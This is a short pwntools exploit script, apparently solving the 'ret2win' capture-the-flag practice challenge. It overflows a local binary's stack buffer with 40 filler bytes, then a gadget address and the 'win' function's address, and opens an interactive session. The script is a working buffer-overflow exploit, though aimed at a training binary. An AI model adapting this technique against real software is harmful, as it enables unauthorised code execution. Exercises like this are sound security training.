from pwn import *


elf = ELF("ret2win")
p = process("./ret2win")
payload = b"A"*40 + p64(0x000000000040044e) + p64(elf.symbols[b'win'])
pause()
p.sendline(payload)
p.interactive()
